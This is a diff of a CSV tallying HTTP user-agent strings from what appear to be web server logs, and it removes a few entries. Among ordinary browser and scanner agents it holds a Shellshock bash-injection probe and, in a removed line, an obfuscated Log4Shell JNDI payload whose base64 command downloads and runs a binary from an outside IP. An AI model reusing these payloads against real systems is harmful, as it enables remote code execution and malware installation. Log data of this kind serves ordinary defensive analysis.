@@ -1,5 +1,4 @@
 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",834
-"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com",631
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",400
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",330
 "Go-http-client/1.1",247
@@ -702,7 +701,6 @@
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",2
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",2
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",2
-"AVAYA",2
 "Mozilla/5.0 (Ubuntu; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",2
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",2
 "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2
@@ -826,7 +824,6 @@
 "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",1
 "Mozilla/5.0 (Windows NT 9_0_1; Win64; x64) AppleWebKit/584.44 (KHTML, like Gecko) Chrome/86.0.596 Safari/537.36",1
-"MicroMessenger",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0",1
 "() { :; }; echo; echo; /bin/bash -c 'expr 901666191 + 976775538'",1
@@ -878,7 +875,6 @@
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/120.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6",1
 "like Gecko) Version/5.1 Safari/534.50\x22",1
-"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//95.214.27.7:4231/TomcatBypass/Command/Base64/Y2QgL3RtcDsgcm0gLXJmIGN1c3RvbXg4NjM7IHdnZXQgaHR0cDovLzk1LjIxNC4yNy4xMDo4MjM3L2Jhc2UvY3VzdG9teDg2MzsgY3VybCAtbyBjdXN0b214ODYgaHR0cDovLzk1LjIxNC4yNy4xMDo4MjM3L2Jhc2UvY3VzdG9teDg2MzsgY2htb2QgNzc3IGN1c3RvbXg4NjM7IC4vY3VzdG9teDg2MyBuZXcg}')",1
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/572.43 (KHTML, like Gecko) Chrome/81.0.175 Safari/537.36",1
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",1
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",1
